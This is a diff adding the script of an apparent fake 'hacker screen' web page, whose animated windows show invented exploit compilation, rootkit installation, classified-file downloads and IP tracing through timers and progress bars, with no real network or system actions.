+        n.x += n.vx + Math.sin(frame*0.02+i)*0.5;
+        n.y += n.vy + Math.cos(frame*0.015+i*0.7)*0.5;
+        if (n.x < n.r || n.x > c.width-n.r) n.vx *= -1;
+        if (n.y < n.r || n.y > 170-n.r) n.vy *= -1;
+        n.x = Math.max(n.r, Math.min(c.width-n.r, n.x));
+        n.y = Math.max(n.r, Math.min(170-n.r, n.y));
+        const col = i%4===0 ? '#ff3333' : i%3===0 ? '#ffaa00' : '#33ff33';
+        ctx.beginPath(); ctx.arc(n.x,n.y,n.r,0,Math.PI*2);
+        ctx.fillStyle = col; ctx.shadowColor = col; ctx.shadowBlur = 8;
+        ctx.fill(); ctx.shadowBlur = 0;
+      });
+      frame++;
+      requestAnimationFrame(draw);
+    }
+    draw();
+  });
+}
+
+/* 6 — COMPILING CODE */
+function openCompiling() {
+  const id = `win-compile-${Date.now()}`;
+  const html = `
+    <div style="font-size:9.5px;color:#555;flex-shrink:0">BUILD: exploit_core.bin — GCC 13.2.0 — Target: x86_64-linux-gnu</div>
+    <div class="log-scroll" id="compile-log-${id}" style="flex:1"></div>`;
+  makeWin({ id, title: '⚙ Compiling Exploit Code — GCC 13.2', glyph: '⚙', w: 370, h: 280, content: html });
+  const lines = [
+    { t: 'ld', v: '[INIT] GCC Compiler v13.2.0 — Starting build...' },
+    { t: 'lg', v: '[OK] Parsing AST syntax tree...' },
+    { t: 'lg', v: '[OK] Resolving imports: libcrypto.a, libpthread.so, libseccomp.so' },
+    { t: 'lw', v: '[COMPILE] src/main.c... (1,240 lines)' },
+    { t: 'lw', v: '[COMPILE] src/exploit.c... (840 lines)' },
+    { t: 'lw', v: '[COMPILE] src/shellcode.asm... (320 lines)' },
+    { t: 'lw', v: '[COMPILE] src/rootkit.c... (2,100 lines)' },
+    { t: 'lw', v: '[LINK] Linking 4 object files...' },
+    { t: 'lw', v: '[STRIP] Removing debug symbols...' },
+    { t: 'lg', v: '[SIGN] Signing with kernel certificate: OK' },
+    { t: 'lg', v: '[PACK] UPX compressing binary...' },
+    { t: 'lg', v: '[OK] Build COMPLETE. Output: /tmp/exploit.bin (84,192 bytes)' },
+    { t: 'lg', v: '[READY] Payload armed and ready for deployment.' },
+  ];
+  let i = 0;
+  const tick = setInterval(() => {
+    const log = document.getElementById(`compile-log-${id}`);
+    if (!log || !document.getElementById(id)) { clearInterval(tick); return; }
+    if (i < lines.length) {
+      const p = document.createElement('p');
+      p.className = lines[i].t;
+      p.textContent = lines[i++].v;
+      log.appendChild(p); log.scrollTop = log.scrollHeight;
+    }
+  }, 480);
+}
+
+/* 7 — INSTALLING MALWARE */
+function openMalware() {
+  const id = `win-malware-${Date.now()}`;
+  const html = `
+    <div class="passive-center">
+      <div style="font-size:44px;color:var(--red);text-shadow:0 0 24px var(--red)">☠</div>
+      <div class="red-text" style="font-size:12.5px;letter-spacing:1.5px" id="malware-title-${id}">INSTALLING ROOTKIT TROJAN...</div>
+      <div class="prog-track" style="width:90%;height:10px">
+        <div class="prog-fill" id="malware-prog-${id}" style="width:0%;background:var(--red);box-shadow:0 0 8px var(--red)"></div>
+      </div>
+      <div id="malware-pct-${id}" class="red-text" style="font-size:13px">0%</div>
+      <div style="font-size:9.5px;color:#3a1a1a">TARGET: /System/Library/Extensions/ | PERSIST: ENABLED</div>
+      <div style="font-size:9.5px;color:#2a2a2a">Method: LaunchDaemon plist injection</div>
+    </div>`;
+  makeWin({ id, title: '☠ Installing Malware — Rootkit v9', glyph: '☠', w: 320, h: 280, content: html });
+  let pct = 0;
+  const tick = setInterval(() => {
+    if (!document.getElementById(id)) { clearInterval(tick); return; }
+    pct = Math.min(100, pct + r(2, 7));
+    const prog = document.getElementById(`malware-prog-${id}`);
+    const pctEl = document.getElementById(`malware-pct-${id}`);
+    const title = document.getElementById(`malware-title-${id}`);
+    if (prog) prog.style.width = pct + '%';
+    if (pctEl) pctEl.textContent = pct + '%';
+    if (pct >= 100) {
+      clearInterval(tick);
+      if (title) { title.textContent = '✓ MALWARE INSTALLED SUCCESSFULLY'; title.style.color = 'var(--green)'; title.style.textShadow = '0 0 10px var(--green)'; }
+    }
+  }, 200);
+}
+
+/* 8 — DOWNLOADING DATA */
+function openDownload() {
+  const id = `win-dl-${Date.now()}`;
+  const files = [
+    { name: 'cia_prism_telemetry_2026.tar.gz', size: '1.4 GB' },
+    { name: 'nsa_xkeyscore_queries.sqlite',     size: '840 MB' },
+    { name: 'pentagon_comms_intercepted.pcap',  size: '2.1 GB' },
+    { name: 'classified_agent_roster.enc',      size: '128 KB' },
+  ];
+  const rows = files.map((f,i) => `
+    <div class="dl-file-row">
+      <div style="font-size:9px;color:#333;width:16px">📄</div>
+      <div class="dl-file-name">${f.name}</div>
+      <div style="font-size:9px;color:#333;flex-shrink:0">${f.size}</div>
+      <div class="dl-file-pct" id="dl-pct-${id}-${i}">0%</div>
+    </div>
+    <div class="prog-track" style="height:5px;margin-bottom:5px"><div class="prog-fill" id="dl-bar-${id}-${i}" style="width:0%"></div></div>`).join('');
+  const html = `
+    <div style="font-size:9.5px;color:#444;margin-bottom:5px;flex-shrink:0">📥 DOWNLOADING CONFIDENTIAL DATA — TOR CIRCUIT ACTIVE — ${r(8,24)} MB/s</div>
+    ${rows}
+    <div style="margin-top:4px;font-size:9.5px;color:#333;flex-shrink:0">Total: 4.4 GB | ETA: ${r(2,8)} min | Circuit: ${r(3,7)} hops</div>`;
+  makeWin({ id, title: '📥 Downloading Confidential Data — Secure Channel', glyph: '📥', w: 390, h: 300, content: html });
+  const progs = files.map(() => 0);
+  const tick = setInterval(() => {
+    if (!document.getElementById(id)) { clearInterval(tick); return; }
+    let allDone = true;
+    files.forEach((_,i) => {
+      if (progs[i] < 100) {
+        allDone = false;
+        progs[i] = Math.min(100, progs[i] + r(1, 5));
+        const bar = document.getElementById(`dl-bar-${id}-${i}`);
+        const pct = document.getElementById(`dl-pct-${id}-${i}`);
+        if (bar) bar.style.width = progs[i] + '%';
+        if (pct) pct.textContent = progs[i] >= 100 ? '✓' : progs[i] + '%';
+      }
+    });
+    if (allDone) clearInterval(tick);
+  }, 220);
+}
+
+/* 9 — SATELLITE (passive variant) */
+function openSatellitePassive() {
+  const id = `win-satpass-${Date.now()}`;
+  const lat = r(20,70), lon = r(10,140);
+  const html = `
+    <div class="passive-center" style="gap:12px">
+      <div id="sp0-${id}" class="sat-phase active">
+        <div style="font-size:32px">🌐</div>
+        <div class="green-text pulse" style="font-size:13px">ESTABLISHING SATELLITE CONNECTION...</div>
+      </div>
+      <div id="sp1-${id}" class="sat-phase">
+        <div style="font-size:28px" style="display:flex;gap:10px">🛰🛰🛰</div>
+        <div class="green-text" style="font-size:12px;letter-spacing:1px">CONSTELLATION LOCK — 3 SATELLITES</div>
+        <div class="mid-text" style="font-size:10px">Orbital period: 94 min | Inclination: 97°</div>
+      </div>
+      <div id="sp2-${id}" class="sat-phase">
+        <div style="font-size:28px">🗺</div>
+        <div class="green-text" style="font-size:13px;letter-spacing:1px">CONNECTION ESTABLISHED</div>
+        <div class="mid-text" style="font-size:10px">Target coordinates: ${lat}°N ${lon}°E</div>
+        <div class="red-text blink" style="font-size:11px">📍 ACTIVE SURVEILLANCE INITIATED</div>
+      </div>
+    </div>`;
+  makeWin({ id, title: 'Establishing Satellite Connection', glyph: '🛰', w: 320, h: 230, content: html });
+  let ph = 0;
+  const timer = setInterval(() => {
+    document.getElementById(`sp${ph}-${id}`)?.classList.remove('active');
+    ph++;
+    if (ph > 2) { clearInterval(timer); return; }
+    document.getElementById(`sp${ph}-${id}`)?.classList.add('active');
+  }, 1600);
+}
+
+/* 0 — IP LOCATOR */
+function openLocator() {
+  const ip = rip();
+  const id = `win-loc-${Date.now()}`;
+  const cities = ['Moscow, RU','Beijing, CN','Tehran, IR','Pyongyang, KP','Minsk, BY','Novosibirsk, RU','Shanghai, CN'];
+  const isps   = ['Rostelecom','ChinaTelecom','TCI','KPTC','BELPAK','Trans-Siberian Cable','China Unicom'];
+  const ci = r(0,cities.length-1);
+  const html = `
+    <div class="passive-center">
+      <div id="loc-p0-${id}" class="loc-phase active">
+        <div style="font-size:30px">🔍</div>
+        <div class="green-text pulse" style="font-size:13px">Locating...</div>
+        <div class="mid-text" style="font-size:10px">Initiating OSINT trace route</div>
+      </div>
+      <div id="loc-p1-${id}" class="loc-phase">
+        <div style="font-size:30px">📡</div>
+        <div class="green-text" style="font-size:13px">Tracking IP: <span class="mid-text">${ip}</span></div>
+        <div class="mid-text" style="font-size:10px">Traversing ${r(8,18)} nodes — resolving WHOIS...</div>
+      </div>
+      <div id="loc-p2-${id}" class="loc-phase">
+        <div style="font-size:30px">📍</div>
+        <div class="green-text" style="font-size:14px;font-weight:700">Location Found!</div>
+        <div style="font-size:11px;color:#666">${ip}</div>
+        <div style="font-size:13px;color:var(--orange)">${cities[ci]}</div>
+        <div style="font-size:9.5px;color:#444">ISP: ${isps[ci]} | Lat: ${(Math.random()*40+20).toFixed(4)}° Lon: ${(Math.random()*80+20).toFixed(4)}°</div>
+      </div>
+    </div>`;
+  makeWin({ id, title: '🎯 IP Locator — Trace Route Active', glyph: '🎯', w: 300, h: 250, content: html });
+  let phase = 0;
+  const timer = setInterval(() => {
+    if (!document.getElementById(id)) { clearInterval(timer); return; }
+    document.getElementById(`loc-p${phase}-${id}`)?.classList.remove('active');
+    phase++;
+    if (phase > 2) { clearInterval(timer); return; }
+    document.getElementById(`loc-p${phase}-${id}`)?.classList.add('active');
+  }, 1500);
+}
+
+/* ═══════════════════════════════════════
+   KEYBOARD HANDLER
+   ═══════════════════════════════════════ */
+
+document.addEventListener('keydown', e => {
+  const tag = document.activeElement?.tagName?.toLowerCase();
+  if (tag === 'input' || tag === 'textarea') return;
+
+  // Space → close topmost window
+  if (e.key === ' ') {
+    e.preventDefault();
+    const allWins = [...document.querySelectorAll('.win')];
+    if (allWins.length) {
+      let topWin = allWins[0], topZval = 0;
+      allWins.forEach(w => {
+        const z = parseInt(w.style.zIndex || 0);
+        if (z > topZval) { topZval = z; topWin = w; }
+      });
+      if (topWin && openWindows[topWin.id]) closeWin(topWin.id);
+    }
+    return;
+  }
+
+  // Number keys → passive windows (no duplicate if already open)
+  if (!isNaN(parseInt(e.key)) && e.key >= '0' && e.key <= '9') {
+    openPassive(parseInt(e.key));
+    return;
+  }
+
+  // Any other key → hide intro, burst bg terminal, add remote line
+  hideIntro();
+  bgBurst(8);
+  typeRemoteLine();
+});
+
+/* ═══════════════════════════════════════
+   AMBIENT TRICKLE (remote terminal)
+   ═══════════════════════════════════════ */
+setInterval(() => {
+  const el = document.getElementById('remote-terminal');
+  if (el && Math.random() < 0.25) typeRemoteLine();
+}, 4000);
+
+</script>
+</body>
+</html>
